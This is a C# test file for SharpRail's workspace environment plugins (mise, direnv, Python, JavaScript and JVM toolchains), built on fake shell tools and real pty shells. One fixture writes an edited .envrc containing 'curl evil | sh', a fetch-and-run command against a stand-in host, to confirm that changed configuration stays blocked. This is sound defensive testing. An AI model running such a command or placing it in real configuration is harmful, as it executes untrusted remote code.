using System.Text;
using System.Text.RegularExpressions;

using SharpRail.Host.Abstractions;
using SharpRail.Host.Core;
using SharpRail.Host.Core.Plugins;
using SharpRail.Plugins.Api;
using SharpRail.Plugins.Api.Host;
using SharpRail.Plugins.EnvChips;
using SharpRail.Plugins.EnvChips.Host;
using SharpRail.Plugins.EnvDirenv;
using SharpRail.Plugins.EnvDirenv.Host;
using SharpRail.Plugins.EnvJavaScript;
using SharpRail.Plugins.EnvJavaScript.Host;
using SharpRail.Plugins.EnvJvm;
using SharpRail.Plugins.EnvJvm.Host;
using SharpRail.Plugins.EnvMise;
using SharpRail.Plugins.EnvMise.Host;
using SharpRail.Plugins.EnvPython;
using SharpRail.Plugins.EnvPython.Host;

namespace SharpRail.Checks;

// The environment plugins (mise, direnv, Python .venv, JavaScript node_modules/.bin) composed by the host's
// workspace environment pipeline, with fake tools on PATH (neither mise nor direnv is a prerequisite of the checks), trust inherited from the default
// workspace only for identical configuration, a slow tool never holding a shell up, and a real shell started with
// the result.
internal static class EnvironmentChecks
{
    private const string Mise = """
        #!/bin/sh
        trust="$FAKE_TOOLS_STATE/trust-mise"
        case "$1" in
          env)
            [ -n "$SHARPRAIL_TOKEN" ] && echo leaked >> "$FAKE_TOOLS_STATE/leaks"
            if ! grep -qx "$PWD" "$trust" 2>/dev/null; then echo "mise ERROR Config files in $PWD/mise.toml are not trusted." >&2; exit 1; fi
            printf '{"MISE_FLAG":"on","PATH":"/mise/tools:%s"}\n' "$PATH" ;;
          trust) echo "$PWD" >> "$trust" ;;
          activate) echo "export SR_ACTIVATED=1" ;;
        esac
        """;

    private const string Direnv = """
        #!/bin/sh
        trust="$FAKE_TOOLS_STATE/trust-direnv"
        case "$1" in
          status)
            if grep -qx "$PWD" "$trust" 2>/dev/null; then allowed=0; else allowed=1; fi
            printf '{"config":{},"state":{"foundRC":{"allowed":%s,"path":"%s/.envrc"}}}\n' "$allowed" "$PWD" ;;
          allow) echo "$PWD" >> "$trust" ;;
          export)
            [ -n "$SHARPRAIL_TOKEN" ] && echo leaked >> "$FAKE_TOOLS_STATE/leaks"
            printf '{"DIRENV_FLAG":"on","FROM_MISE":"%s","PATH":"/direnv/bin:%s","DROP_ME":null,"JAVA_HOME":"/direnv/jdk"}\n' "$MISE_FLAG" "$PATH" ;;
        esac
        """;

    private sealed class Log
    {
        public List<string> Lines { get; } = [];
        public void Add(string scope, string level, string message) { lock (Lines) Lines.Add($"{level} {scope}: {message}"); }
        public bool Has(string level, string text) { lock (Lines) return Lines.Any(line => line.StartsWith(level + " ") && line.Contains(text)); }
    }

    private static readonly (PluginManifest, PluginHostModule?)[] Builtins =
    [
        (EnvMiseContract.Manifest, new EnvMiseHost()),
        (EnvDirenvContract.Manifest, new EnvDirenvHost()),
        (EnvPythonContract.Manifest, new EnvPythonHost()),
        (EnvJavaScriptContract.Manifest, new EnvJavaScriptHost()),
        (EnvJvmContract.Manifest, new EnvJvmHost()),
        (EnvChipsContract.Manifest, new EnvChipsHost())
    ];

    private sealed record Composed(PluginRuntime Runtime, HostStateStore State) : IAsyncDisposable
    {
        public async Task Disable(string id)
        {
            await State.ChangeAsync([HostStateChange.PluginEnabled(id, false)]);
            await Runtime.Schedule();
        }

        public ValueTask DisposeAsync() => Runtime.DisposeAsync();
    }

    private static async Task<Composed> Compose(string directory, Log log, PtyTerminalService? terminals = null)
    {
        Directory.CreateDirectory(directory);
        var state = new HostStateStore(directory);
        var runtime = new PluginRuntime(new PluginHostSeams { StateDirectory = directory, State = state, Builtins = Builtins, Log = log.Add, Terminals = terminals });
        await runtime.Start();
        return new(runtime, state);
    }

    // The pipeline reads the process environment, so the fake tools and probes are set for the call and restored.
    private static async Task<T> WithEnvironment<T>(Tools tools, (string Name, string Value)[] extra, Func<Task<T>> run)
    {
        var host = tools.Host(extra);
        var saved = host.Keys.ToDictionary(name => name, Environment.GetEnvironmentVariable);
        foreach (var (name, value) in host) Environment.SetEnvironmentVariable(name, value);
        try { return await run(); }
        finally { foreach (var (name, value) in saved) Environment.SetEnvironmentVariable(name, value); }
    }

    private static void Require(bool condition, string message)
    {
        if (!condition) throw new InvalidOperationException(message);
    }

    internal static async Task Run(string root)
    {
        if (OperatingSystem.IsWindows())
        {
            Console.WriteLine("SKIP environment checks: the fake tools are POSIX shell scripts.");
            return;
        }
        var directory = Path.Combine(root, "environment");
        if (Directory.Exists(directory)) Directory.Delete(directory, true);
        var tools = Fixture(directory);
        await Resolution(directory, tools);
        await Runtimes(directory, tools);
        await Cache();
        await Shell(directory, tools);
        Console.WriteLine("PASS environment: the plugins compose in order and each works alone, trust is inherited only for identical configuration, a slow tool never holds a shell up, and a shell starts with the result");
    }

    private sealed record Tools(string Bin, string State)
    {
        public Dictionary<string, string> Host(params (string Name, string Value)[] extra)
        {
            var host = Environment.GetEnvironmentVariables().Cast<System.Collections.DictionaryEntry>().ToDictionary(entry => (string)entry.Key, entry => (string?)entry.Value ?? "");
            host["PATH"] = Bin + Path.PathSeparator + (host.GetValueOrDefault("PATH") ?? "/usr/bin:/bin");
            host["FAKE_TOOLS_STATE"] = State;
            foreach (var (name, value) in extra) host[name] = value;
            return host;
        }

        public void Trust(string tool, string directory) => File.AppendAllText(Path.Combine(State, "trust-" + tool), directory + "\n");

        public bool Trusted(string tool, string directory) =>
            File.Exists(Path.Combine(State, "trust-" + tool)) && File.ReadAllLines(Path.Combine(State, "trust-" + tool)).Contains(directory);

        public bool Leaked => File.Exists(Path.Combine(State, "leaks"));
    }

    [System.Runtime.Versioning.UnsupportedOSPlatform("windows")]
    private static Tools Fixture(string directory)
    {
        var bin = Path.Combine(directory, "bin");
        var state = Path.Combine(directory, "state");
        Directory.CreateDirectory(bin);
        Directory.CreateDirectory(state);
        foreach (var (name, script) in new[] { ("mise", Mise), ("direnv", Direnv), ("poetry", "#!/bin/sh\necho \"$FAKE_TOOLS_STATE/poetry-venv\"\n") })
        {
            var file = Path.Combine(bin, name);
            File.WriteAllText(file, string.Join('\n', script.Split('\n').Select(line => line.TrimStart())) + "\n");
            File.SetUnixFileMode(file, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }
        return new(bin, state);
    }

    private static string Workspace(string directory, string name, string envrc = "use mise\n", string mise = "[tools]\nnode = \"24\"\n")
    {
        var path = Path.GetFullPath(Path.Combine(directory, name));
        Directory.CreateDirectory(path);
        File.WriteAllText(Path.Combine(path, ".envrc"), envrc);
        File.WriteAllText(Path.Combine(path, "mise.toml"), mise);
        return path;
    }

    private static async Task Resolution(string directory, Tools tools)
    {
        var origin = Workspace(directory, "default");
        tools.Trust("mise", origin);
        tools.Trust("direnv", origin);
        var log = new Log();
        await using var composed = await Compose(Path.Combine(directory, "host-resolution"), log);
        var runtime = composed.Runtime;
        Task<IReadOnlyDictionary<string, string>> Resolve(string workspace, string? defaultWorkspace, params (string Name, string Value)[] extra) =>
            WithEnvironment<IReadOnlyDictionary<string, string>>(tools, extra, async () => (await runtime.ResolveEnvironmentAsync(workspace, defaultWorkspace, CancellationToken.None)).Variables);
        Require((await runtime.ListAsync()).Count(entry => entry.Id.StartsWith("env-") && entry.Status == PluginStatus.Active) == 6, "The environment plugins are active by default.");

        // A new worktree with the same configuration inherits the default workspace's trust, and every plugin composes.
        var worktree = Workspace(directory, "worktree");
        Directory.CreateDirectory(Path.Combine(worktree, ".venv"));
        File.WriteAllText(Path.Combine(worktree, ".venv", "pyvenv.cfg"), "home = /usr/bin\n");
        Directory.CreateDirectory(Path.Combine(worktree, "node_modules", ".bin"));
        var result = await Resolve(worktree, origin, ("SHARPRAIL_TOKEN", "secret"), ("DROP_ME", "present"));
        Require(result.GetValueOrDefault("MISE_FLAG") == "on" && result.GetValueOrDefault("DIRENV_FLAG") == "on", "mise and direnv both contribute: " + string.Join(", ", log.Lines));
        Require(result.GetValueOrDefault("FROM_MISE") == "on", "direnv runs after mise and sees its variables.");
        Require(result.GetValueOrDefault("VIRTUAL_ENV") == Path.Combine(worktree, ".venv"), "An existing .venv is activated.");
        var path = result["PATH"].Split(Path.PathSeparator);
        Require(path[0] == Path.Combine(worktree, "node_modules", ".bin") && path[1] == Path.Combine(worktree, ".venv", "bin") && path[2] == "/direnv/bin" && path[3] == "/mise/tools" && path[4] == tools.Bin,
            "PATH entries stack in plugin order, the last plugin first: " + result["PATH"]);
        Require(tools.Trusted("mise", worktree) && tools.Trusted("direnv", worktree) && log.Has("info", "matches the project's default workspace"), "Identical configuration inherits both trust decisions.");
        Require(!tools.Leaked && !result.ContainsKey("SHARPRAIL_TOKEN"), "The host's session token never reaches a tool or the shell.");
        Require(!result.ContainsKey("DROP_ME"), "A variable a tool unsets is not contributed.");
        Require(!result.ContainsKey("FAKE_TOOLS_STATE") && !result.ContainsKey("HOME"), "Only changed variables are contributed.");

        // What the steps reported becomes the terminals' chips, with the variables each step set, and the shells get their hooks.
        var full = await WithEnvironment(tools, [], async () => await runtime.ResolveEnvironmentAsync(worktree, origin, CancellationToken.None));
        Require(full.Facts.Select(fact => fact.Label).SequenceEqual(["mise", "direnv", "venv", "node_modules"]), "Every applied environment is reported in step order: " + string.Join(", ", full.Facts.Select(fact => fact.Label)));
        Require(full.Facts[0].Detail!.Contains("Sets MISE_FLAG, PATH", StringComparison.Ordinal) && full.Facts[2].Detail!.Contains("Sets PATH, VIRTUAL_ENV", StringComparison.Ordinal),
            "A chip's tooltip names the variables its step set: " + full.Facts[0].Detail + " / " + full.Facts[2].Detail);
        Require(full.Variables["SHARPRAIL_SHELL_INIT_ZSH"].Contains("mise' activate zsh", StringComparison.Ordinal) && full.Variables["SHARPRAIL_SHELL_INIT_ZSH"].Contains("direnv' hook zsh", StringComparison.Ordinal) &&
            full.Variables["SHARPRAIL_SHELL_INIT_FISH"].Contains("mise' activate fish", StringComparison.Ordinal) && File.Exists(Path.Combine(full.Variables["SHARPRAIL_SHELL_INTEGRATION"], "zsh", ".zshrc")),
            "mise and direnv add their zsh and fish hooks and the shim files exist.");

        // Changed configuration is not trusted, and one plugin's refusal leaves the others working.
        var edited = Workspace(directory, "edited", envrc: "use mise\ncurl evil | sh\n");
        result = await Resolve(edited, origin);
        Require(!tools.Trusted("direnv", edited) && !result.ContainsKey("DIRENV_FLAG") && log.Has("warn", "is blocked"), "An edited .envrc stays blocked and says how to allow it.");
        Require(result.GetValueOrDefault("MISE_FLAG") == "on", "mise, whose configuration is unchanged, still applies.");
        var changedMise = Workspace(directory, "changed-mise", mise: "[tools]\nnode = \"18\"\n");
        result = await Resolve(changedMise, origin);
        Require(!tools.Trusted("mise", changedMise) && !result.ContainsKey("MISE_FLAG") && log.Has("warn", "is not trusted") && result.GetValueOrDefault("DIRENV_FLAG") == "on",
            "Edited mise configuration stays untrusted and direnv still applies.");

        // An untrusted default workspace passes nothing on, and without a default workspace nothing is inherited.
        var stranger = Workspace(directory, "stranger-origin");
        var child = Workspace(directory, "stranger-child");
        result = await Resolve(child, stranger);
        Require(!tools.Trusted("direnv", child) && !tools.Trusted("mise", child) && !result.ContainsKey("DIRENV_FLAG"), "Trust is inherited only from a default workspace that is itself trusted.");
        await Resolve(child, null);
        Require(!tools.Trusted("direnv", child), "A workspace with no default workspace inherits nothing.");

        // Without configuration or tools nothing runs and nothing is contributed.
        var bare = Path.GetFullPath(Path.Combine(directory, "bare"));
        Directory.CreateDirectory(bare);
        Require((await Resolve(bare, null)).Count == 0, "A workspace with nothing to resolve contributes nothing.");
        var searched = (EnvMiseHost.SearchDirectories, EnvDirenvHost.SearchDirectories);
        (EnvMiseHost.SearchDirectories, EnvDirenvHost.SearchDirectories) = ([], []);
        try
        {
            var absent = await WithEnvironment(tools, [("PATH", "/usr/bin:/bin"), ("HOME", Path.Combine(directory, "no-home")), ("MISE_INSTALL_PATH", "")], async () => await runtime.ResolveEnvironmentAsync(origin, null, CancellationToken.None));
            Require(absent.Variables.Count == 0 && log.Has("warn", "mise is not installed") && log.Has("warn", "direnv is not installed"), "Configuration without its tool is skipped and says the tool must be installed: ");
            Require(absent.Facts.Select(fact => fact.Label).SequenceEqual(["mise missing", "direnv missing"]), "A missing tool shows as a chip: " + string.Join(", ", absent.Facts.Select(fact => fact.Label)));
        }
        finally { (EnvMiseHost.SearchDirectories, EnvDirenvHost.SearchDirectories) = searched; }

        // An app started with the system's PATH still finds a tool installed in a well-known directory, and its shell hook names it absolutely.
        EnvMiseHost.SearchDirectories = [tools.Bin];
        try
        {
            var launched = await WithEnvironment(tools, [("PATH", "/usr/bin:/bin"), ("MISE_INSTALL_PATH", "")], async () => await runtime.ResolveEnvironmentAsync(worktree, origin, CancellationToken.None));
            Require(launched.Variables.GetValueOrDefault("MISE_FLAG") == "on" && launched.Variables["SHARPRAIL_SHELL_INIT_ZSH"].Contains($"'{Path.Combine(tools.Bin, "mise")}' activate zsh", StringComparison.Ordinal),
                "mise found outside PATH applies, and the hook runs it by absolute path.");
        }
        finally { EnvMiseHost.SearchDirectories = searched.Item1; }

        // Each plugin is independent: with one disabled only the others contribute.
        await composed.Disable(EnvDirenvContract.Id);
        result = await Resolve(worktree, origin);
        Require(result.GetValueOrDefault("MISE_FLAG") == "on" && !result.ContainsKey("DIRENV_FLAG") && result.ContainsKey("VIRTUAL_ENV"), "Disabling direnv leaves mise, Python and JavaScript working.");
    }

    // Python and JavaScript runtimes, each found from a fake home so no real installation is read.
    [System.Runtime.Versioning.UnsupportedOSPlatform("windows")]
    private static async Task Runtimes(string directory, Tools tools)
    {
        var home = Path.GetFullPath(Path.Combine(directory, "home"));
        string Make(string relative, params string[] files)
        {
            var path = Path.Combine(home, relative);
            Directory.CreateDirectory(path);
            foreach (var file in files) File.WriteAllText(Path.Combine(path, file), "");
            return path;
        }
        var shims = Make(".pyenv/shims");
        var node20 = Make(".nvm/versions/node/v20.11.1/bin", "node");
        Make(".nvm/versions/node/v20.5.0/bin", "node");
        var node22 = Make(".nvm/versions/node/v22.1.0/bin", "node");
        Make(".nvm/alias/lts", "iron", "hydrogen");
        File.WriteAllText(Path.Combine(home, ".nvm", "alias", "lts", "iron"), "v20.11.1\n");
        File.WriteAllText(Path.Combine(home, ".nvm", "alias", "lts", "hydrogen"), "v18.19.0\n");
        File.WriteAllText(Path.Combine(home, ".nvm", "alias", "default"), "lts/iron\n");
        Make(".sdkman/candidates/java/21.0.2-tem/bin", "java");
        Make(".sdkman/candidates/java/21.0.5-tem/bin", "java");
        Make(".sdkman/candidates/java/17.0.9-tem/bin", "java");
        var linked = Make("jdks/temurin-21/bin", "java");
        Directory.CreateDirectory(Path.Combine(home, ".jenv", "versions"));
        File.CreateSymbolicLink(Path.Combine(home, ".jenv", "versions", "temurin64-21"), Path.GetDirectoryName(linked)!);
        var bun = Make(".bun/bin");
        var deno = Make(".deno/bin");
        var volta = Make(".volta/bin");
        var log = new Log();
        await using var composed = await Compose(Path.Combine(directory, "host-runtimes"), log);
        Task<IReadOnlyDictionary<string, string>> Resolve(string workspace) =>
            WithEnvironment<IReadOnlyDictionary<string, string>>(tools, [("HOME", home), ("SDKMAN_DIR", Path.Combine(home, ".sdkman")), ("JENV_ROOT", Path.Combine(home, ".jenv"))], async () => (await composed.Runtime.ResolveEnvironmentAsync(workspace, null, CancellationToken.None)).Variables);
        string Project(string name, params (string File, string Text)[] files)
        {
            var path = Path.GetFullPath(Path.Combine(directory, name));
            Directory.CreateDirectory(path);
            foreach (var (file, text) in files)
            {
                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(path, file))!);
                File.WriteAllText(Path.Combine(path, file), text);
            }
            return path;
        }

        composedRuntime = composed.Runtime;
        await Jvm(directory, tools, Resolve, home, log);
        var plain = Project("py-venv", ("venv/pyvenv.cfg", "home = /usr/bin\n"));
        Require((await Resolve(plain))["VIRTUAL_ENV"] == Path.Combine(plain, "venv"), "A venv directory without a dot is activated too.");
        var conda = Project("py-conda", ("env/conda-meta/history", ""));
        var result = await Resolve(conda);
        Require(result["CONDA_PREFIX"] == Path.Combine(conda, "env") && result["PATH"].StartsWith(Path.Combine(conda, "env", "bin") + Path.PathSeparator) && !result.ContainsKey("VIRTUAL_ENV"), "A conda prefix is activated.");
        var pinned = Project("py-pyenv", (".python-version", "# comment\n3.12.1\n3.11.4\n"));
        result = await Resolve(pinned);
        Require(result["PYENV_VERSION"] == "3.12.1:3.11.4" && result["PATH"].StartsWith(shims + Path.PathSeparator) && result["PYENV_ROOT"] == Path.Combine(home, ".pyenv"), "A .python-version selects pyenv's versions and shims.");
        var poetryVenv = Path.Combine(tools.State, "poetry-venv");
        Directory.CreateDirectory(poetryVenv);
        File.WriteAllText(Path.Combine(poetryVenv, "pyvenv.cfg"), "");
        var poetry = Project("py-poetry", ("poetry.lock", ""));
        Require((await Resolve(poetry))["VIRTUAL_ENV"] == poetryVenv, "A poetry environment outside the project is found through poetry.");

        var brewBin = Path.Combine(directory, "brew-bin");
        Directory.CreateDirectory(brewBin);
        File.WriteAllText(Path.Combine(brewBin, "pipenv"), "#!/bin/sh\necho \"$FAKE_TOOLS_STATE/poetry-venv\"\n");
        File.SetUnixFileMode(Path.Combine(brewBin, "pipenv"), UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        var searched = EnvPythonHost.SearchDirectories;
        EnvPythonHost.SearchDirectories = [brewBin];
        try
        {
            var viaPipenv = await WithEnvironment(tools, [("HOME", home), ("PATH", "/usr/bin:/bin")], async () => await composed.Runtime.ResolveEnvironmentAsync(Project("py-pipenv", ("Pipfile", "")), null, CancellationToken.None));
            Require(viaPipenv.Variables["VIRTUAL_ENV"] == poetryVenv, "pipenv installed outside PATH (Homebrew's bin) is found.");
        }
        finally { EnvPythonHost.SearchDirectories = searched; }

        var nvm = Project("js-nvm", (".nvmrc", "v20\n"), ("node_modules/.bin/tool", ""));
        var path = (await Resolve(nvm))["PATH"].Split(Path.PathSeparator);
        Require(path[0] == Path.Combine(nvm, "node_modules", ".bin") && path[1] == node20, "A .nvmrc selects the highest installed matching nvm version, behind the project's own binaries: " + string.Join(":", path.Take(3)));
        Require((await Resolve(nvm))["NVM_BIN"] == node20, "An nvm version sets NVM_BIN.");
        foreach (var (spec, expected) in new[] { ("lts/*", node20), ("lts/iron", node20), ("default", node20), ("node", node22), ("stable", node22) })
            Require((await Resolve(Project("js-alias-" + spec.Replace('/', '-').Replace('*', 'x'), (".nvmrc", spec + "\n"))))["PATH"].Split(Path.PathSeparator)[0] == expected, $"The nvm alias {spec} selects {expected}.");
        Require(!(await Resolve(Project("js-alias-hydrogen", (".nvmrc", "lts/hydrogen\n")))).ContainsKey("PATH"), "An alias for a version that is not installed selects nothing.");
        Require(!(await Resolve(Project("js-alias-unknown", (".nvmrc", "iojs\n")))).ContainsKey("PATH"), "An unknown alias selects nothing.");
        Require(!(await Resolve(Project("js-missing", (".nvmrc", "18\n")))).ContainsKey("PATH"), "A version that is not installed selects nothing.");
        Require((await Resolve(Project("js-bun", ("bun.lock", ""))))["PATH"].Split(Path.PathSeparator)[0] == bun, "A Bun project gets Bun's install directory.");
        Require((await Resolve(Project("js-deno", ("deno.json", "{}"))))["PATH"].Split(Path.PathSeparator)[0] == deno, "A Deno project gets Deno's install directory.");
        result = await Resolve(Project("js-volta", ("package.json", "{\"volta\":{\"node\":\"20.11.1\"}}"), (".nvmrc", "22\n")));
        Require(result["PATH"].Split(Path.PathSeparator)[0] == volta && result["VOLTA_HOME"] == Path.Combine(home, ".volta") && !result["PATH"].Contains("v22.1.0"), "A package.json that pins a Volta toolchain gets Volta's shims, not nvm's.");
    }

    private static async Task Jvm(string directory, Tools tools, Func<string, Task<IReadOnlyDictionary<string, string>>> resolve, string home, Log log)
    {
        string Project(string name, params (string File, string Text)[] files)
        {
            var path = Path.GetFullPath(Path.Combine(directory, name));
            Directory.CreateDirectory(path);
            foreach (var (file, text) in files) File.WriteAllText(Path.Combine(path, file), text);
            return path;
        }
        var candidates = Path.Combine(home, ".sdkman", "candidates", "java");
        var rc = Project("jvm-sdkmanrc", (".sdkmanrc", "# sdkman\njava=21.0.2-tem\ngradle=8.5\n"));
        var result = await resolve(rc);
        Require(result["JAVA_HOME"] == Path.Combine(candidates, "21.0.2-tem") && result["PATH"].StartsWith(Path.Combine(candidates, "21.0.2-tem", "bin") + Path.PathSeparator), ".sdkmanrc selects its sdkman candidate.");
        Require(!(await resolve(Project("jvm-missing", (".sdkmanrc", "java=99.0.0-tem\n")))).ContainsKey("JAVA_HOME") && log.Has("warn", "sdk env install"), "An uninstalled candidate selects nothing and says how to install it.");
        Require((await resolve(Project("jvm-jenv", (".java-version", "temurin64-21\n"))))["JAVA_HOME"] == Path.Combine(home, "jdks", "temurin-21"), "A .java-version names a jenv version, resolved through its link to the JDK's home.");
        Require((await resolve(Project("jvm-prefix", (".java-version", "21\n"))))["JAVA_HOME"] == Path.Combine(candidates, "21.0.5-tem"), "A major version without a jenv entry selects the highest sdkman candidate it prefixes.");
        Require(!(await resolve(Project("jvm-none", (".java-version", "8\n")))).ContainsKey("JAVA_HOME") && log.Has("warn", "neither jenv nor sdkman"), "An unavailable version selects nothing.");
        // Homebrew's sdkman is found with no SDKMAN_DIR, the way an app started from the dock has it.
        var brew = Path.GetFullPath(Path.Combine(directory, "brew"));
        var brewJdk = Path.Combine(brew, "opt", "sdkman-cli", "libexec", "candidates", "java", "25-tem");
        Directory.CreateDirectory(Path.Combine(brewJdk, "bin"));
        File.WriteAllText(Path.Combine(brewJdk, "bin", "java"), "");
        var prefixes = EnvJvmHost.BrewPrefixes;
        EnvJvmHost.BrewPrefixes = [brew];
        try
        {
            var emptyHome = Path.Combine(directory, "no-home");
            var viaBrew = await WithEnvironment(tools, [("HOME", emptyHome), ("SDKMAN_DIR", "")], async () => await composedRuntime!.ResolveEnvironmentAsync(Project("jvm-brew", (".sdkmanrc", "java=25-tem\n")), null, CancellationToken.None));
            Require(viaBrew.Variables["JAVA_HOME"] == brewJdk, "An sdkman installed by Homebrew is found without SDKMAN_DIR.");
        }
        finally { EnvJvmHost.BrewPrefixes = prefixes; }
        var direnv = Project("jvm-direnv", (".envrc", "use mise\n"), (".sdkmanrc", "java=21.0.2-tem\n"));
        tools.Trust("direnv", direnv);
        Require((await resolve(direnv))["JAVA_HOME"] == "/direnv/jdk", "A JAVA_HOME an earlier step chose is kept.");
        Require((await WithEnvironment(tools, [("HOME", home), ("SDKMAN_DIR", Path.Combine(home, ".sdkman")), ("JAVA_HOME", "/host/jdk")], async () => (await composedRuntime!.ResolveEnvironmentAsync(rc, null, CancellationToken.None)).Variables))["JAVA_HOME"] == Path.Combine(candidates, "21.0.2-tem"),
            "The workspace's choice replaces a JAVA_HOME inherited from the host.");
    }

    private static PluginRuntime? composedRuntime;

    private static async Task Cache()
    {
        var calls = 0;
        var release = new TaskCompletionSource();
        var slow = false;
        var warnings = new List<string>();
        var cache = new EnvironmentResolutions(async (directory, token) =>
        {
            Interlocked.Increment(ref calls);
            if (slow) await release.Task.WaitAsync(token);
            return new ResolvedEnvironment(new Dictionary<string, string> { ["WHO"] = slow ? "fresh" : "first" }, []);
        }, warnings.Add, CancellationToken.None);
        var budget = EnvironmentResolutions.Budget;
        EnvironmentResolutions.Budget = TimeSpan.FromMilliseconds(150);
        try
        {
            Require(cache.Contribution("/w").Count == 0, "Nothing is contributed before the first resolution.");
            await cache.PrepareAsync("/w", CancellationToken.None);
            Require(cache.Contribution("/w")["WHO"] == "first", "A resolution inside the budget is contributed.");

            slow = true;
            var watch = System.Diagnostics.Stopwatch.StartNew();
            await cache.PrepareAsync("/w", CancellationToken.None);
            Require(watch.Elapsed < TimeSpan.FromSeconds(3) && cache.Contribution("/w")["WHO"] == "first" && warnings.Count == 1,
                "A tool slower than the budget does not hold the shell up; it starts with the last good environment and says so.");
            var shared = cache.Start("/w");
            Require(shared == cache.Start("/w") && calls == 2, "A resolution already running is shared.");
            release.SetResult();
            await shared;
            Require(cache.Contribution("/w")["WHO"] == "fresh", "The slow resolution is kept for the next shell.");

            using var cancel = new CancellationTokenSource();
            release = new TaskCompletionSource();
            var waiting = cache.PrepareAsync("/other", cancel.Token).AsTask();
            await cancel.CancelAsync();
            try { await waiting; Require(false, "A cancelled attach cancels the wait."); }
            catch (OperationCanceledException) { }
            release.SetResult();
        }
        finally { EnvironmentResolutions.Budget = budget; }
    }

    // Real shells through the plugin runtime: the host resolves before the shell spawns, so the very first shell has it,
    // the chips plugin knows what applied, and a zsh shell also runs the hooks after the user's own .zshrc.
    private static async Task Shell(string directory, Tools tools)
    {
        var worktree = Workspace(directory, "shell-worktree");
        tools.Trust("mise", worktree);
        tools.Trust("direnv", worktree);
        var home = Path.GetFullPath(Path.Combine(directory, "shell-home"));
        Directory.CreateDirectory(home);
        File.WriteAllText(Path.Combine(home, ".zshrc"), "export USERRC=1\n");
        var zsh = new[] { "/bin/zsh", "/usr/bin/zsh" }.FirstOrDefault(File.Exists);
        await WithEnvironment(tools, [("HOME", home), ("ZDOTDIR", "")], async () =>
        {
            await RunShell(directory, "/bin/sh", worktree, "printf 'SHELL_%s_%s_\\n' \"$DIRENV_FLAG\" \"$FROM_MISE\"\r", "SHELL_on_on_", async composed =>
            {
                var chips = (EnvChipsChanged)(await composed.Runtime.CallAsync(new(EnvChipsContract.Id, "get", new EnvChipsQuery(worktree), "client")))!;
                Require(chips.Chips.Select(chip => chip.Label).SequenceEqual(["mise", "direnv"]), "The chips plugin knows what applied to the workspace: " + string.Join(", ", chips.Chips.Select(chip => chip.Label)));
            });
            if (zsh is null) { Console.WriteLine("SKIP environment zsh shell integration: no zsh."); return 0; }
            await RunShell(directory, zsh, worktree, "printf 'ZSH_%s_%s_%s_\\n' \"$SR_ACTIVATED\" \"$USERRC\" \"${ZDOTDIR-unset}\"\r", "ZSH_1_1_unset_", null);
            return 0;
        });
    }

    private static async Task RunShell(string directory, string shell, string worktree, string command, string expected, Func<Composed, Task>? then)
    {
        await using var pty = new PtyTerminalService(shell);
        await using var plugins = await Compose(Path.Combine(directory, "host-shell-" + Path.GetFileName(shell)), new Log(), pty);
        var tab = new TerminalRef(worktree, "tab-" + Path.GetFileName(shell));
        var attached = await pty.AttachAsync(new(PtyTerminalService.SessionFor(tab), worktree, "client", 100, 30) { TabKey = tab.TabKey });
        var text = new StringBuilder(Encoding.UTF8.GetString(attached.Replay.Span));
        _ = Task.Run(async () =>
        {
            try { await foreach (var chunk in attached.ReadAsync()) lock (text) text.Append(Encoding.UTF8.GetString(chunk.Span)); }
            catch (Exception) { }
        });
        await attached.WriteAsync(Encoding.UTF8.GetBytes(command));
        var deadline = DateTime.UtcNow.AddSeconds(30);
        while (true)
        {
            lock (text) if (Regex.IsMatch(text.ToString(), expected + "(?!%)")) break;
            if (DateTime.UtcNow > deadline) throw new TimeoutException($"The first {Path.GetFileName(shell)} shell in a worktree has the resolved environment ({expected}): " + text);
            await Task.Delay(25);
        }
        if (then is not null) await then(plugins);
    }
}